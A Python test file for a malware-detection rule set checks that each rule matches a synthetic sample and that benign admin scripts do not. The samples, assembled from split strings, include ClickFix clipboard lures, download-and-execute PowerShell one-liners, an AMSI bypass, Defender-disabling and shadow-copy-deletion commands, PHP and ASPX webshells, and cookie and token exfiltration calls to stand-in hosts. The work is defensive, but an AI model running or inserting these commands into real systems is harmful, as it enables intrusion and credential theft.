"""Tests for the 2026 threat-landscape Aegis-Lite rules (aegis/data/rules/threats_2026.json).

* the rule file loads and every rule compiles (the engine silently skips bad rules, so counts are compared);
* ids are unique, prefixed AEG-T26- and carry current (non-revoked) ATT&CK technique ids;
* every rule fires on a small synthetic sample built at runtime from harmless indicator strings, and the sample
  is of a file type the rule is actually applied to;
* normal admin scripts, installers, manifests and web pages do not match any rule;
* the rule file, the docs and this test file do not trigger the rules themselves.

No real malware is stored: samples are text fragments joined at runtime (fragments are split so that this file
does not match its own rules).
"""

from __future__ import annotations

import json
import os
import re
import time
from pathlib import Path
from typing import Callable, Dict, List, Tuple

import pytest

from aegis.core import fileanalysis as fa
from aegis.core.rules import Rule, load_rule_files
from aegis.core.models import Severity

ROOT = Path(__file__).resolve().parent.parent
RULE_FILE = ROOT / "aegis" / "data" / "rules" / "threats_2026.json"

# ATT&CK v19/v20 revoked these; they must not be used in new content (see docs/THREAT_LANDSCAPE.md section 7.3).
REVOKED_ATTACK_IDS = {"T1562", "T1562.001", "T1562.002", "T1562.004", "T1562.006", "T1562.009", "T1574.002",
                      "T1070.001"}


def J(*parts: str) -> str:
    return "".join(parts)


def b(text: str) -> bytes:
    return text.encode("utf-8")


# ---------------------------------------------------------------------------------------------- fixtures

@pytest.fixture(scope="module")
def raw_rules() -> List[dict]:
    return json.loads(RULE_FILE.read_text(encoding="utf-8"))


@pytest.fixture(scope="module")
def rules() -> Dict[str, Rule]:
    loaded = load_rule_files([RULE_FILE])
    return {r.id: r for r in loaded}


# ---------------------------------------------------------------------------------------------- positives

PS = J("power", "shell")
FAKE_ONION = "abcdefg234567" * 4 + "abcd"  # 56 chars from the base32 alphabet
XMR_WALLET = "4A" + "B" * 93

# rule suffix -> (extension, sample bytes)
POSITIVES: Dict[str, Tuple[str, bytes]] = {
    "CF-FIX-LURE": (".html", b(J(
        "<html><h1>Aw, Snap! Something went wrong</h1><p>To fix this issue press Win+R, paste and press Enter.</p>",
        "<script>navigator.clip", "board.writeText('", PS, " -w hidden -c x')</script></html>"))),
    "CF-TERMINAL-LURE": (".html", b(J(
        "<p>Press Win + X, then I to open Windows Terminal and paste.</p><script>navigator.clip",
        "board.writeText('", PS, " -c x')</script>"))),
    "CF-FILEFIX-LURE": (".html", b(J(
        "<p>Click Choose File, then paste into the File Explorer address bar.</p><script>navigator.clip",
        "board.writeText('", PS, " -c x", " " * 24, "# C:\\\\Company\\\\Docs\\\\report.pdf')</script>"))),
    "CF-FINGER-PIPE": (".bat", b(J("cmd /c fin", "ger user@192.0.2.10 | cmd"))),
    "CF-NSLOOKUP-STAGER": (".bat", b(J("cmd /c nslook", "up example.test 192.0.2.53 | findstr Name: | cmd"))),
    "CF-APPV-VBS": (".ps1", b(J("wscript.exe C:\\Windows\\System32\\SyncAppv", "PublishingServer.vbs \"n; ",
                                 "iex (irm http://192.0.2.1/x)\""))),
    "CF-IEX-IRM-RAWIP": (".ps1", b(J(PS, " -c \"i", "ex(irm '203.0.113.7:8442/abc' -UseBasicParsing)\""))),
    "CF-MSHTA-REMOTE": (".bat", b(J("msh", "ta https://example.test/a.hta.mp4"))),
    "CF-STAGE1-PROGRAMDATA": (".ps1", b(J("New-Item -ItemType Directory C:\\ProgramData\\Zoo", "ms"))),
    "STEALER-ABE-BYPASS": (".exe", b(J("MZ", "\x00" * 64, "app_bound_encrypted", "_key\x00GoogleChromeElevation",
                                       "Service\x00exo", "dus\x00meta", "mask\x00"))),
    "STEALER-CDP-COOKIES": (".exe", b(J("MZ", "\x00" * 64, "Network.getAll", "Cookies\x00--remote-debugging",
                                        "-port=9222\x00Login", " Data\x00"))),
    "STEALER-VIDAR-DEADDROP": (".exe", b(J("MZ", "\x00" * 64, "steamcommunity.com/", "profiles/1\x00t.", "me/chan\x00Login",
                                           " Data\x00"))),
    "STEALER-TELEGRAM-EXFIL": (".exe", b(J("MZ", "\x00" * 64, "api.telegram.org/", "bot123:abc/send", "Document\x00Login",
                                           " Data\x00"))),
    "PUP-AMBER-ALBATROSS": (".txt", b("setup.exe --safe" + "torun --channel=0123456789abcdef")),
    "JUSTASKJACKY-INSTALLER": (".exe", b(J("MZ", "\x00" * 64, "Go", "AskBobby.exe\x00"))),
    "NODE-TASK-IMPLANT": (".bat", b(J("schta", "sks /create /tn X /tr \"node.exe C:\\Users\\u\\AppData\\Local\\Programs\\ManualX\\",
                                      "1234.js\" /sc onlogon"))),
    "PYRAT-MODELORAT": (".bat", b(J("schta", "sks /create /tn \"SoftwareProtection\" /tr \"python", "w.exe C:\\Users\\x\\AppData\\",
                                    "Roaming\\mod", "es.py\" /sc minute /mo 5"))),
    "EXT-CRASHFIX-IOC": (".txt", b(J("https://nexs", "nield.com/track?id=1"))),
    "EXT-COOKIE-POLLING": (".js", b(J("setInterval(()=>{chrome.cook", "ies.getAll({}, c=>fetch('https://example.test/c',",
                                      "{method:'POST',body:JSON.stringify(c)}))},60000)"))),
    "EXT-MANIFEST-COOKIES-NATIVE": (".json", b(J(
        "{\"manifest_version\":3,\"permissions\":[\"cook", "ies\",\"native", "Messaging\"],\"host_permissions\":[\"<all", "_urls>\"]}"))),
    "EXT-FORCELIST-SCRIPT": (".ps1", b(J(
        "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstall", "Forcelist' -Name 1 -Value 'id;https://example.test/u.xml'; ",
        PS, " -WindowStyle Hidden"))),
    "NATIVEMSG-SCRIPT-HOST": (".json", b(J(
        "{\"name\":\"com.example.host\",\"path\":\"C:\\\\Users\\\\x\\\\host.b", "at\",\"type\":\"std", "io\",",
        "\"allowed_", "origins\":[\"chrome-extension://abc/\"]}"))),
    "LOADER-RESILOADER": (".dll", b(J("MZ", "\x00" * 64, "AtLoren", "Base\x00"))),
    "ETHERHIDING-JS": (".js", b(J("const r=await fetch('https://bsc-datase", "ed.binance.org',{body:JSON.stringify({method:'eth_",
                                  "call'})});ev", "al(at", "ob(x));"))),
    "JS-ZEROWIDTH-DECODE": (".js", J("const s='", "\u200b\u200c\u200b", "';const n=pars", "eInt(bits,2);ev", "al(code);").encode("utf-8")),
    "DEFENDER-EXCL-BROAD": (".ps1", b(J("Add-MpPref", "erence -ExclusionPath \"C:\\Users\" -Force"))),
    "DEFENDER-EXCL-REG": (".bat", b(J("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclu", "sions\\Paths\" /v C:\\Users /t REG_DWORD /d 0"))),
    "DEFENDER-DISABLE": (".ps1", b(J("Set-MpPref", "erence -DisableRealtime", "Monitoring $true"))),
    "AMSI-BYPASS": (".ps1", b(J("[Ref].Assembly.GetType('System.Management.Automation.Am", "siUtils').GetField('amsiInit",
                                "Failed','NonPublic,Static').SetValue($null,$true)"))),
    "ETW-TAMPER-SCRIPT": (".ps1", b(J("[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.",
                                      "EventProvider').GetField('m_ena", "bled','NonPublic,Instance')"))),
    "SCHTASK-FREQUENT-USERDIR": (".bat", b(J("schta", "sks /create /tn Upd /tr \"", PS, " -w hidden -f C:\\ProgramData\\x\\a.ps1\" ",
                                             "/sc minute /mo 2"))),
    "RUNKEY-INTERPRETER": (".bat", b(J("reg ad", "d HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d \"python",
                                       "w.exe C:\\Users\\u\\AppData\\Roaming\\x.py\""))),
    "WMI-EVENT-PERSIST": (".ps1", b(J("Set-WmiInstance -Class __Event", "Filter -Namespace root\\subscription; ",
                                      "Set-WmiInstance -Class CommandLine", "EventConsumer"))),
    "COM-HIJACK-REG": (".bat", b(J("reg ad", "d \"HKCU\\Software\\Classes\\CLSID\\{11111111-2222-3333-4444-555555555555}\\Inproc",
                                   "Server32\" /ve /d \"C:\\Users\\u\\AppData\\Roaming\\x.dll\""))),
    "UAC-BYPASS-REG-HIJACK": (".bat", b(J("reg ad", "d HKCU\\Software\\Classes\\ms-sett", "ings\\Shell\\Open\\command /v Delegate",
                                          "Execute /f"))),
    "UAC-BYPASS-CMSTPLUA": (".exe", b(J("MZ", "\x00" * 64, "ICMLua", "Util\x00Elevation:Administ", "rator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"))),
    "BITS-NOTIFY-PERSIST": (".bat", b(J("bitsad", "min /create job & bitsad", "min /addfile job https://example.test/a.exe C:\\a.exe & ",
                                        "bitsad", "min /SetNotify", "CmdLine job C:\\a.exe NUL"))),
    "UAC-DISABLE": (".bat", b(J("reg ad", "d HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v Enable", "LUA /t REG_DWORD /d 0 /f"))),
    "SAFEMODE-REBOOT": (".bat", b(J("bcd", "edit /set {default} safe", "boot minimal\r\nshut", "down /r /t 0"))),
    "PS-DOWNLOAD-IEX-HIDDEN": (".ps1", b(J(PS, " -w hidden -c \"i", "ex ((New-Object Net.WebClient).Download", "String('http://example.test/a'))\""))),
    "EDR-KILLER-SCRIPT": (".bat", b(J("task", "kill /f /im MsMp", "Eng.exe & task", "kill /f /im Sentinel", "Agent.exe & sc st",
                                      "op CSFalcon", "Service"))),
    "BYOVD-SC-CREATE": (".bat", b(J("sc.exe cre", "ate drv binPath=C:\\windows\\temp\\drv.sys type=kernel && sc.exe start drv"))),
    "RANSOM-INHIBIT-RECOVERY": (".bat", b(J("vssad", "min delete shadows /all /quiet\r\nbcd", "edit /set {default} recoveryenabled no"))),
    "RANSOM-NOTE-DOUBLE-EXTORT": (".txt", b(J(
        "We have exfiltr", "ated your data. If you do not pay we will publish your data. Use the decryption tool after ",
        "payment. Visit ", FAKE_ONION, ".on", "ion in Tor Browser."))),
    "SMARTLOADER-LAUNCHER": (".bat", b(J("@echo off\r\nstart lua", "jit.exe proto.txt\r\n"))),
    "SMARTLOADER-LUA-STAGE": (".txt", b(J("local ffi = require(\"ffi\")\nffi.cd", "ef[[ void* GetConsole", "Window(); int Show", "Window(void*, int); ",
                                          "void* Virtual", "Alloc(void*, size_t, int, int); ]]"))),
    "SMARTLOADER-SCHTASK": (".bat", b(J("schta", "sks /create /tn Audio /tr \"%LOCALAPPDATA%\\Audio\\loader.exe %LOCALAPPDATA%\\Audio\\proto.txt\" /sc daily"))),
    "MINER-WALLET-POOL": (".txt", b(J("pool.support", "xmr.com:3333 ", XMR_WALLET, " --donate-lev", "el=1"))),
    "LNK-PS-ENCODED-DOWNLOAD": (".lnk", b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 16 +
                                (J(PS, ".exe -WindowStyle Hidden -Encoded", "Command AAAA")).encode("utf-16-le")),
    "LNK-LOLBIN-REMOTE": (".lnk", b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 16 +
                          (J("msh", "ta.exe https://example.test/x")).encode("utf-16-le")),
    "HTA-DOWNLOADER": (".hta", b(J("<hta:appli", "cation id=x><script>new ActiveXObject(\"WScript.", "Shell\").Run(\"cmd /c x\")</script>"))),
    "WSH-DOWNLOADER": (".js", b(J("var h=new ActiveXObject(\"MSXML2.XML", "HTTP\");var s=new ActiveXObject(\"ADODB.", "Stream\");",
                                  "var sh=new ActiveXObject(\"WScript.", "Shell\");sh.Run(f);"))),
    "MSBUILD-INLINE-TASK": (".xml", b(J("<Project><Using", "Task TaskName=\"x\" TaskFactory=\"CodeTask", "Factory\"><Task><Code Type=\"Class\">",
                                        "Assembly.Lo", "ad(Convert.FromBase", "64String(s))</Code></Task></UsingTask></Project>"))),
    "NPM-INSTALL-HOOK-DOWNLOAD": (".json", b(J("{\"name\":\"x\",\"scripts\":{\"post", "install\":\"cu", "rl -s https://example.test/a.sh | sh\"}}"))),
    "NPM-WORM-CREDENTIAL-SWEEP": (".js", b(J("fs.readFileSync(home+'/.npm", "rc');exec('npm pub", "lish');process.env.GITHUB_", "TOKEN;",
                                             "fetch('https://webhook.", "site/abc')"))),
    "NPM-CHAINDROP-IOC": (".js", b(J("fetch('https://npm-", "cache.com/router')"))),
    "PYPI-SETUP-EXEC": (".py", b(J("from setuptools import setup\nimport base64\nex", "ec(base64.b64", "decode('cHJpbnQoMSk='))\n"))),
    "WEBSHELL-PHP-DYNAMIC": (".php", b(J("<?", "php @sys", "tem($_REQUEST['c']); ?>"))),
    "WEBSHELL-ASPX-PROCESS": (".aspx", b(J("<%@ Page Lang", "uage=\"C#\" %><% System.Diagnostics.Pro", "cess.Start(\"cmd.exe\", Request[\"c\"]); %>"))),
    "ONENOTE-EMBEDDED-SCRIPT": (".one", bytes.fromhex("E4525C7B8CD8A74DAEB15378D02996D3") + b"\x00" * 32 +
                                bytes.fromhex("E716E3BD65261145A4C48D4D0B7A9EAC") + b"\x00" * 8 + b"@echo off\r\n"),
}


def test_rule_file_loads_and_all_rules_compile(raw_rules, rules):
    assert 30 <= len(raw_rules) <= 60, "task asks for 30-60 new rules"
    assert len(rules) == len(raw_rules), (
        "load_rule_files silently skips rules that fail to compile: "
        f"{sorted({r['id'] for r in raw_rules} - set(rules))}")


def test_ids_unique_prefixed_and_well_formed(raw_rules):
    ids = [r["id"] for r in raw_rules]
    assert len(ids) == len(set(ids))
    for r in raw_rules:
        assert r["id"].startswith("AEG-T26-"), r["id"]
        assert r["name"] and r["description"], r["id"]
        assert r["severity"] in ("info", "low", "medium", "high", "critical"), r["id"]
        assert r.get("references"), f"{r['id']} needs at least one source URL"
        assert all(u.startswith("https://") for u in r["references"]), r["id"]
        assert r["mitre"], f"{r['id']} needs ATT&CK ids"
        for m in r["mitre"]:
            assert re.fullmatch(r"T\d{4}(\.\d{3})?", m), (r["id"], m)
            assert m not in REVOKED_ATTACK_IDS, f"{r['id']} uses revoked ATT&CK id {m}"


def test_severity_distribution_is_realistic(raw_rules):
    counts = {s: sum(1 for r in raw_rules if r["severity"] == s) for s in ("low", "medium", "high", "critical")}
    assert counts["critical"] == 0, "file-content indicators alone are not 'confirmed active threat'"
    assert counts["high"] >= 10 and counts["medium"] >= 5


def test_every_rule_has_a_positive_sample(raw_rules):
    suffixes = {r["id"][len("AEG-T26-"):] for r in raw_rules}
    assert suffixes == set(POSITIVES), (suffixes ^ set(POSITIVES))


@pytest.mark.parametrize("suffix", sorted(POSITIVES))
def test_positive_sample_matches_and_rule_applies_to_it(rules, suffix):
    rule = rules["AEG-T26-" + suffix]
    ext, data = POSITIVES[suffix]
    hits = rule.match(data)
    assert hits is not None, f"{rule.id} did not match its synthetic sample"
    kind = fa.classify(data[:4096], ext.lstrip("."))
    assert rule.applies_to(kind, ext), f"{rule.id} would not run on a {ext} file (classified as {kind!r})"


def test_positive_samples_do_not_trip_unrelated_rules_excessively(rules):
    """A sample may legitimately trip a sibling rule, but not a large share of the set."""
    for suffix, (_, data) in POSITIVES.items():
        matched = [r.id for r in rules.values() if r.match(data) is not None]
        assert ("AEG-T26-" + suffix) in matched
        assert len(matched) <= 4, f"{suffix} matched {matched}"


# ---------------------------------------------------------------------------------------------- negatives

BENIGN: Dict[str, str] = {
    "powershell_admin_script": J(
        "# Weekly maintenance\n",
        "$stopped = Get-Service | Where-Object { $_.Status -eq 'Stopped' }\n",
        "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5\n",
        "Invoke-WebRequest -Uri https://example.com/installer.msi -OutFile $env:TEMP\\installer.msi\n",
        "Start-Process msiexec.exe -ArgumentList \"/i $env:TEMP\\installer.msi /qn\" -Wait\n",
        "Register-ScheduledTask -TaskName 'NightlyBackup' -Action (New-ScheduledTaskAction -Execute 'C:\\Scripts\\backup.ps1') ",
        "-Trigger (New-ScheduledTaskTrigger -Daily -At 3am)\n",
        "Add-MpPreference -ExclusionPath 'C:\\Dev\\build-output'\n",
        "Set-MpPreference -DisableRealtimeMonitoring $false\n",
        "Get-WmiObject Win32_Shadowcopy | Select-Object ID, InstallDate\n"),
    "installer_batch": J(
        "@echo off\r\ncopy app.exe \"C:\\Program Files\\MyApp\\\"\r\n",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyApp /d \"C:\\Program Files\\MyApp\\myapp.exe --minimized\" /f\r\n",
        "sc create MyService binPath= \"C:\\Program Files\\MyApp\\svc.exe\" start= auto\r\n",
        "schtasks /create /tn \"MyApp Update\" /tr \"C:\\Program Files\\MyApp\\update.exe\" /sc daily /st 03:00\r\n",
        "vssadmin list shadows\r\nbcdedit /enum\r\nnet stop spooler\r\ntaskkill /f /im notepad.exe\r\n"),
    "package_json": json.dumps({
        "name": "my-app", "version": "1.0.0",
        "scripts": {"build": "webpack", "test": "jest", "postinstall": "node scripts/postinstall.js",
                    "install": "node-gyp rebuild", "prepare": "husky install"},
        "dependencies": {"express": "^4.19.0"}}),
    "setup_py": "from setuptools import setup, find_packages\nsetup(name='x', packages=find_packages(), install_requires=['requests'])\n"
                "import subprocess\nsubprocess.run(['git', 'status'])\n",
    "html_copy_button": "<html><button onclick=\"navigator.clipboard.writeText('npm install express')\">Copy</button>"
                        "<p>Open a terminal and press Ctrl+V to paste, then Enter.</p></html>",
    "html_static_challenge": "<html><title>Just a moment...</title><h1>Verify you are human by completing the action below.</h1>"
                             "<p>example.com needs to review the security of your connection.</p></html>",
    "vbs_admin": "Set sh = CreateObject(\"WScript.Shell\")\nsh.Run(\"notepad.exe\")\n",
    "php_form": "<?php\n$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);\nif ($email) { mail('a@example.com', 'Hi', 'x'); }\n?>",
    "webext_manifest": json.dumps({"manifest_version": 3, "name": "Blocker",
                                   "permissions": ["storage", "tabs", "declarativeNetRequest"],
                                   "host_permissions": ["<all_urls>"]}),
    "official_installer_oneliners": J(
        PS, " -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"\n",
        "irm get.scoop.sh | iex\n",
        "Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString("
        "'https://community.chocolatey.org/install.ps1'))\n"),
    "private_ip_script": "iex (irm http://192.168.1.10:8080/setup.ps1)\n",
    "dns_troubleshooting": "nslookup example.com 8.8.8.8\r\nnslookup -type=mx example.com | findstr Address\r\n",
    "readme_text": "This tool helps you recover from ransomware. Download the official decryption tool from the vendor's site. "
                  "Never pay the attackers. Back up your files regularly.\n",
    "python_script": "import os, json\nprint(json.dumps(dict(os.environ)))\nwith open('a.txt','w') as f:\n    f.write('hi')\n",
    "telegram_bot_lib": "import requests\nrequests.post('https://api.telegram.org/bot' + TOKEN + '/sendMessage', json={'text': 'ok'})\n",
    "ms_build_normal": "<Project Sdk=\"Microsoft.NET.Sdk\"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup></Project>",
    "start_notepad_batch": "@echo off\r\nstart notepad.exe notes.txt\r\n",
    "lua_script": "local ffi = require(\"ffi\")\nffi.cdef[[ int printf(const char*, ...); ]]\nffi.C.printf(\"hi\")\n",
    "js_normal": "const express = require('express');\nconst app = express();\napp.get('/', (q, r) => r.send('hi'));\n"
                 "setInterval(() => console.log('tick'), 60000);\n",
}


BENIGN_EXT = {"powershell_admin_script": "ps1", "installer_batch": "bat", "package_json": "json", "setup_py": "py",
              "html_copy_button": "html", "html_static_challenge": "html", "vbs_admin": "vbs", "php_form": "php",
              "webext_manifest": "json", "official_installer_oneliners": "ps1", "private_ip_script": "ps1",
              "dns_troubleshooting": "bat", "readme_text": "txt", "python_script": "py", "telegram_bot_lib": "py",
              "ms_build_normal": "csproj", "js_normal": "js", "start_notepad_batch": "bat", "lua_script": "lua"}
REQUIRED_STRICT = ("powershell_admin_script", "installer_batch", "package_json")


@pytest.mark.parametrize("name", sorted(BENIGN))
def test_benign_samples_match_no_applicable_rule(rules, name):
    """What the scanner would actually do: only rules that apply to the file's type are evaluated."""
    data = BENIGN[name].encode("utf-8")
    ext = BENIGN_EXT[name]
    kind = fa.classify(data[:4096], ext)
    matched = [r.id for r in rules.values() if r.applies_to(kind, ext) and r.match(data) is not None]
    assert matched == [], f"benign sample {name!r} ({kind}/{ext}) matched {matched}"


@pytest.mark.parametrize("name", REQUIRED_STRICT)
def test_core_benign_samples_match_no_rule_at_all(rules, name):
    """Stricter: a normal admin script, installer batch and package.json match nothing regardless of type."""
    data = BENIGN[name].encode("utf-8")
    matched = [r.id for r in rules.values() if r.match(data) is not None]
    assert matched == [], f"benign sample {name!r} matched {matched}"


def test_benign_binary_and_stringy_pe_do_not_match(rules):
    blob = os.urandom(8192)
    pe_like = b"MZ" + b"\x00" * 64 + b"Login Data\x00api.telegram.org/bot\x00Cookies\x00steamcommunity.com/profiles/\x00"
    for data in (blob, pe_like):
        assert [r.id for r in rules.values() if r.match(data) is not None] == []


# ---------------------------------------------------------------------------------------------- hygiene

def test_project_docs_do_not_trigger_these_rules(rules):
    """Scanning an Aegis checkout must not flag the rule/feed documentation (indicators there are defanged).

    The rule JSON and this test file are excluded on purpose: like core.json they necessarily contain indicator
    text (descriptions, patterns, synthetic samples), so the file scanner should skip Aegis's own rule and test
    directories (noted in the hand-off report). docs/THREAT_LANDSCAPE.md quotes many command lines verbatim for
    defenders and is not covered either."""
    targets: List[Path] = []
    for doc in ("docs/FEEDS.md", "docs/RULES.md"):
        p = ROOT / doc
        if p.exists():
            targets.append(p)
    for path in targets:
        data = path.read_bytes()
        ext = path.suffix.lstrip(".")
        kind = fa.classify(data[:4096], ext)
        flagged = [r.id for r in rules.values() if r.applies_to(kind, ext) and r.match(data) is not None]
        assert flagged == [], f"{path.name} triggers {flagged}"


def test_all_rules_are_fast_on_a_large_text_buffer(rules):
    """Rough guard against catastrophic regexes: 8 MB of mixed text must scan in a few seconds in total."""
    chunk = (b"lorem ipsum dolor sit amet " * 40 + b"\r\n" + b"A" * 4000 + b"\r\n") * 600
    data = (chunk * 2)[:8 * 1024 * 1024]
    start = time.monotonic()
    for r in rules.values():
        assert r.match(data) is None
    elapsed = time.monotonic() - start
    assert elapsed < 60, f"rules too slow: {elapsed:.1f}s"


def test_rule_objects_expose_expected_metadata(rules):
    r = rules["AEG-T26-DEFENDER-EXCL-BROAD"]
    assert r.severity == Severity.HIGH and r.mitre == ["T1685"] and r.source == "threats_2026.json"
